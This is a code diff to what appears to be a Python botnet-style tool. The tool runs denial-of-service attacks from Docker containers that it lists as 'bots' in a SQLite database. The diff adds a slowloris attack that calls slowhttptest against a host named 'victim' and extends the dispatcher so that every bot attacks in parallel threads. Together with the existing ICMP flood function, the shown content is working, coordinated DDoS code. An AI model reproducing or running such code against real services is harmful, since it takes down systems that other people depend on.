@@ -1,4 +1,5 @@
 import docker, threading, sqlite3
+from flask import request
 from .settings import client
 
 
@@ -14,14 +15,22 @@ def icmp_flood(container_id):
     print(result.output.decode())
 
 
-def execute_attack(attack):
+def slowloris(container_id, number_of_connections):
+    container = client.containers.get(container_id)
+    result = container.exec_run(
+        f"slowhttptest -c {number_of_connections} -g -u http://victim"
+    )
+    print(result.output.decode())
+
+
+def execute_attack(attack, *args):
     conn = sqlite3.connect("database.db")
     cursor = conn.cursor()
     cursor.execute("SELECT container_id FROM bots")
     result = cursor.fetchall()
     container_ids = [x[0] for x in result]
     threads = [
-        threading.Thread(target=attack, args=(container_id,))
+        threading.Thread(target=attack, args=(container_id, *args))
         for container_id in container_ids
     ]
 
